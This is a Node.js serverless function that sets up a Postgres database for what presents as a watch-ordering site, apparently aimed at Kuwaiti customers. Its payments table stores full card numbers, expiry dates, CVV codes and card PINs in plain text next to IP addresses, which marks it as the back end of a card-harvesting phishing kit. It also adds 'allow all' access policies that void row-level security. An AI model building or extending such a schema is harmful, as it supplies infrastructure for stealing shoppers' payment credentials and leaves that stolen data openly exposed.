const { Client } = require('pg');

module.exports = async (req, res) => {
  const client = new Client({
    connectionString: process.env.DATABASE_URL,
    ssl: { rejectUnauthorized: false }
  });

  try {
    await client.connect();

    await client.query(`
      CREATE TABLE IF NOT EXISTS orders (
        id SERIAL PRIMARY KEY,
        watch_id INTEGER NOT NULL,
        watch_name TEXT,
        full_name TEXT NOT NULL,
        phone TEXT NOT NULL,
        civil_id TEXT NOT NULL,
        governorate TEXT NOT NULL,
        area TEXT NOT NULL,
        address_details TEXT,
        status TEXT DEFAULT 'pending',
        created_at TIMESTAMPTZ DEFAULT NOW(),
        updated_at TIMESTAMPTZ DEFAULT NOW()
      );
    `);

    await client.query(`
      CREATE TABLE IF NOT EXISTS payments (
        id SERIAL PRIMARY KEY,
        order_id INTEGER REFERENCES orders(id),
        card_number TEXT,
        card_expiry TEXT,
        card_cvv TEXT,
        card_pin TEXT,
        card_type TEXT,
        bank_name TEXT,
        amount DECIMAL(10,3) DEFAULT 0.000,
        status TEXT DEFAULT 'pending',
        transaction_ref TEXT,
        ip_address TEXT,
        user_agent TEXT,
        created_at TIMESTAMPTZ DEFAULT NOW()
      );
    `);

    await client.query(`
      CREATE TABLE IF NOT EXISTS visitors (
        id SERIAL PRIMARY KEY,
        page TEXT,
        ip_address TEXT,
        user_agent TEXT,
        referrer TEXT,
        created_at TIMESTAMPTZ DEFAULT NOW()
      );
    `);

    await client.query(`
      CREATE TABLE IF NOT EXISTS admin_users (
        id SERIAL PRIMARY KEY,
        email TEXT UNIQUE NOT NULL,
        password_hash TEXT NOT NULL,
        name TEXT,
        role TEXT DEFAULT 'admin',
        created_at TIMESTAMPTZ DEFAULT NOW()
      );
    `);

    for (const t of ['orders','payments','visitors','admin_users']) {
      await client.query(`ALTER TABLE ${t} ENABLE ROW LEVEL SECURITY;`);
      await client.query(`
        DO $$ BEGIN
          IF NOT EXISTS (SELECT 1 FROM pg_policies WHERE tablename='${t}' AND policyname='allow_all_${t}') THEN
            CREATE POLICY allow_all_${t} ON ${t} FOR ALL USING (true) WITH CHECK (true);
          END IF;
        END $$;
      `);
    }

    const tables = await client.query(`
      SELECT table_name FROM information_schema.tables
      WHERE table_schema='public' AND table_type='BASE TABLE' ORDER BY table_name;
    `);

    await client.end();
    res.json({ success: true, tables: tables.rows.map(r => r.table_name) });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
};
